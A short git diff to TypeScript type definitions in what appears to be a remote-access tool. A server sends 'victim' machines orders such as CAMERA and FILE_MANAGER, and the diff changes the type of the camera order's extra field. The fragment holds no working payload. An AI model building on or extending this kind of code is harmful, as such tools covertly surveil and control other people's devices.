@@ -3,7 +3,7 @@ import { type ServerToVictimEvents, type VictimOrder } from '../enums';
 export type ServerOrderPayload =
     | {
           order: VictimOrder.CAMERA;
-          extra: 'camList' | string;
+          extra: 'camList' | number;
       }
     | {
           order: VictimOrder.FILE_MANAGER;
